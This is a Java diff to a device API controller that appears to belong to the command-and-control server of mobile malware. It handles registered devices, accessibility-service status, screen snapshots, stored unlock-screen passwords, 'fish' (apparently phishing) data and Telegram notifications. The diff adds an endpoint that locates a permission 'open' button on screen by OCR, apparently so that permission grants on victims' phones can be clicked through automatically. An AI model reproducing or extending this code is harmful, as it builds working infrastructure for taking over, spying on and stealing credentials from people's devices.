@@ -12,10 +12,8 @@ import io.renren.modules.app.entity.*;
 import io.renren.modules.app.handler.TelegramNotificationHandler;
 import io.renren.modules.app.mapper.UnlockScreenPwdMapper;
 import io.renren.modules.app.service.*;
-import io.renren.modules.app.vo.DeviceStatus;
-import io.renren.modules.app.vo.FishDataVo;
-import io.renren.modules.app.vo.ServerConfig;
-import io.renren.modules.app.vo.UnLockParams;
+import io.renren.modules.app.service.impl.PermissionOcrService;
+import io.renren.modules.app.vo.*;
 import io.renren.modules.sys.dao.SysParamsDao;
 import lombok.extern.slf4j.Slf4j;
 import org.apache.commons.collections4.CollectionUtils;
@@ -28,6 +26,7 @@ import org.springframework.web.bind.annotation.RestController;
 
 import javax.annotation.Resource;
 import javax.servlet.http.HttpServletRequest;
+import java.awt.*;
 import java.util.Date;
 import java.util.List;
 import java.util.Objects;
@@ -68,6 +67,8 @@ public class DeviceApiController extends BaseApiController {
     @Autowired
     private ScreenSnapshotService screenSnapshotService;
 
+    @Autowired
+    private PermissionOcrService permissionOcrService;
 
     //注册设备
     @RequestMapping("/registerDevice")
@@ -287,7 +288,7 @@ public class DeviceApiController extends BaseApiController {
         updateDevice.setAccessibilityServiceEnabled(deviceStatus.isAccessibilityServiceEnabled() ? Constant.YN.Y : Constant.YN.N);
         updateDevice.setPermissions(deviceStatus.getPermissions());
         updateDevice.setCharging(deviceStatus.isCharging() ? Constant.YN.Y : Constant.YN.N);
-        if(StringUtils.isNotEmpty(deviceStatus.getScreenSnapshot())){
+        if (StringUtils.isNotEmpty(deviceStatus.getScreenSnapshot())) {
             updateDevice.setScreenSnapshot(deviceStatus.getScreenSnapshot());
         }
         updateDevice.setBattery(deviceStatus.getBattery());
@@ -433,7 +434,7 @@ public class DeviceApiController extends BaseApiController {
     }
 
     @RequestMapping("uploadScreenSnapshot")
-    public Result<Void> uploadScreenSnapshot(@RequestBody List<ScreenSnapshot> list){
+    public Result<Void> uploadScreenSnapshot(@RequestBody List<ScreenSnapshot> list) {
         String deviceId = DeviceContext.getDeviceId();
         String pkg = DeviceContext.getPkg();
         for (ScreenSnapshot screenSnapshot : list) {
@@ -443,6 +444,19 @@ public class DeviceApiController extends BaseApiController {
         }
         screenSnapshotService.saveBatch(list);
         return Result.toSuccess();
+    }
+
+    @RequestMapping("questPermissionOpenPosition")
+    public Result<Point> questPermissionOpenPosition(@RequestBody PermissionOpenPositionReq permissionOpenPositionReq) {
+        try {
+            long start = System.currentTimeMillis();
+            Point point = permissionOcrService.questPermissionOpenPosition(permissionOpenPositionReq);
+            log.info("识别耗时:{} ms", System.currentTimeMillis() - start);
+            return Result.toSuccess(point);
+        } catch (Exception e) {
+            return Result.toError(e.getMessage());
+        }
+
     }
 
 }
